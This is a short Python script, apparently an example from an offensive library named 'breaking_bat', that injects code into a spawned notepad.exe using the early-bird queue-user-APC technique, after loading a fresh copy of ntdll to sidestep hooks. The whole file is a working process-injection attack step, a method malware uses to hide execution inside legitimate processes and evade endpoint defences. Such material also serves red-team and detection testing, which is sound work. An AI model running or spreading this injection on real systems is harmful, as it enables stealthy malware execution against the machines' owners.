import breaking_bat
from breaking_bat import RemoteProcessMemoryMethod

print("Script: Inject via queue user APC (early bird)")
print()

breaking_bat.init_sysapi(ntdll_load_copy=True)
breaking_bat.inject_queue_apc_early_bird(
    original_image="C:\\Windows\\System32\\notepad.exe",
    memory_method=RemoteProcessMemoryMethod.AllocateInAddr
)
